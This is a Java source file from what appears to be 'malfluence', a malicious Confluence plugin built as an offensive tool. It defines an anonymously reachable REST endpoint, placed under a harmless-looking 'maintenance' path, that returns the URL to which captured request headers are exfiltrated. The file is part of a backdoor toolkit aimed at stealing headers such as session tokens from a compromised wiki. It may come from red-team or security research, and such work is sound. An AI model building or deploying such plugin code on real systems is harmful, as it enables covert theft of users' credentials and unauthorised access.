package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Log;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.core.Response;

// Returns the URL where the headers will be exfiltrated to
// GET /maintenance/headerexfil
@Path("/headerexfil")
public class HeaderExfil {
    @GET
    @AnonymousAllowed
    public Response ReflectHeaders() {
        try {
            if (HeaderExfilConfig.Enabled) {
                // Only return URL if enabled
                return Response
                        .status(Response.Status.OK)
                        .entity(HeaderExfilConfig.ExfilURL)
                        .build();
            } else {
                return Response
                        .status(Response.Status.NOT_FOUND)
                        .build();
            }

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}